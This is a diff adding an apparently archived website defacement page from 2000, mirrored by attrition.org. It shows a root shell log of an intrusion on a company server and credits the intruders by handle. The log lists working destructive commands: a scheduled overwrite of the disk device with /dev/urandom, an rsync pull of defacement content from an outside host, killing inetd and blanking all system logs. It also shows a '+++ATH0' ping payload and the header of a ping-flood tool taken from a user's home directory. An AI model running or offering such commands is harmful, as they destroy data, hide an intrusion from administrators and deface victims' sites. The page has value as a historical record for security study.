@@ -1,0 +1,59 @@
+<title> dont hate us Interconsult Bulgaria www.icb.bg </title>
+<pre>
+##command summary##
+
+bash# uname -a;id
+Linux internet 2.2.16 #2 Tue Aug 1 15:11:13 EEST 2000 i586 unknown
+uid=0(root) gid=0(root) groups=0(root)
+bash# /usr/sbin/atd -s
+bash# date
+Sun Sep  3 11:58:39 EEST 2000
+bash# at now + 1 hour
+at> cat /dev/urandom > `grep ext2 /etc/mtab | awk '{print $1}'`
+at>
+warning: commands will be executed using /bin/sh
+job 1 at 2000-09-03 13:01
+bash# rsync -r test@dal-tgn-tlw-vty141.as.wcom.net:/tmp/www /home/httpd/html
+bash# killall -9 inetd
+bash# for log in $(ls -l /var/log| awk '{print $9}');do echo > $log;done
+bash# ls -aF  ~petko
+./             .mc/             Net-RawIP_tar.tar                  mnt/
+../            .screenrc        amisfrag_tar.tar                   pinger
+.bash_history  .ssh/            bot_cmds.tcl                       rootcron.sh
+.bash_logout   .swp             gpm-root.sh                        stuff
+.bash_profile  BitchX/          ircd-hybrid-6b127+UniBg-p2.tar.gz  stuff.c
+.bashrc        Net-RawIP-0.07/  ircii-pana-75p3.tar.gz
+bash# cat ~petko/pinger
+ping -c1 -p 2b2b2b415448300d $1
+bash# head -15 ~petko/stuff.c
+/* tuffit.c
+   Noc-Wage -*- wage@idirect.ca
+           12/12/98
+
+   This is just a modified version of:
+   pingflood.c by (AntireZ) Salvatore Sanfilippo <md5330@mclink.it>
+   enhanced by David Welton <davidw@cks.com>
+
+   I simply made it so that it will generate the ping packets so
+   that they contain 0x7e which is an illegal character in PPP
+   frames.  I also made it so you could set the size of the packet
+   hopefully this came with my keen veracity article
+   but incase it didn't here is part of it  so you understand why
+   this even exsists:
+
+bash# tail ~petko/.bash_history
+ltrace --help
+telnet vanilla.online.bg
+ssh vanilla.online.bg
+spam --help
+man spam
+bash# exit
+exit
+
+##decications: to petko a.k.a _b0fh_##
+## to the curiois: no exploits used.only SAE(system administration errors)
+</pre>
+
+who did that?
+ sheib,darkx,famzah,grizmin,thunder,error,null,v_a_d_e_r
+<!-- www.attrition.org web hack mirror - watermark or something -->
